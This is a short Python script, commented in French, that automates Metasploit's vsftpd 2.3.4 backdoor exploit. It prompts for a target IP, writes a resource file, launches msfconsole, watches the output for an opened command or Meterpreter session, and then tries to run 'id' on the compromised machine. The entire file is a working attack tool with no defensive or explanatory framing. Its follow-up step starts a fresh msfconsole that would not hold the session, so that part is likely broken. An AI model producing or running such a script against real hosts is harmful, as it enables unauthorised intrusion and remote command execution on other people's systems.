import subprocess
import time

def create_rc_file(ip_address):
    """Crée un fichier .rc pour Metasploit avec l'IP cible."""
    rc_content = f"""
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOSTS {ip_address}
exploit
"""
    with open("exploit_vsftpd.rc", "w") as rc_file:
        rc_file.write(rc_content)

def exploit_vsftpd():
    """Lance Metasploit pour exploiter la vulnérabilité VSFTPD."""
    ip_address = input("What is the targeted IP ? :")
    create_rc_file(ip_address)
    
    try:
        print("[*] Lancement de Metasploit...")

        # Lancer Metasploit avec le fichier .rc
        process = subprocess.Popen(
            ["msfconsole", "-r", "exploit_vsftpd.rc"], 
            stdin=subprocess.PIPE,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True
        )

        # Lire la sortie du processus en temps réel
        for line in process.stdout:
            print(line.strip())  # Affiche chaque ligne de la sortie Metasploit

            # Détection de la session ouverte
            if "Command shell session" in line or "Meterpreter session" in line:
                print("[+] Session ouverte avec succès !")
                break

        # Envoyer des commandes à la session ouverte
        print("[*] Tentative d'exécution de commandes sur la session...")
        time.sleep(5)  # Attente pour que la session soit stable

        # Exemple de commandes via subprocess
        session_process = subprocess.Popen(
            ["msfconsole", "-x", "sessions -i 1; id; exit"],
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True
        )
        
        session_output, session_error = session_process.communicate()

        print("[*] Résultats de l'exploitation :")
        print(session_output)

        if session_error:
            print("[!] Erreurs rencontrées :")
            print(session_error)

    except Exception as e:
        print(f"[!] Une erreur s'est produite : {e}")
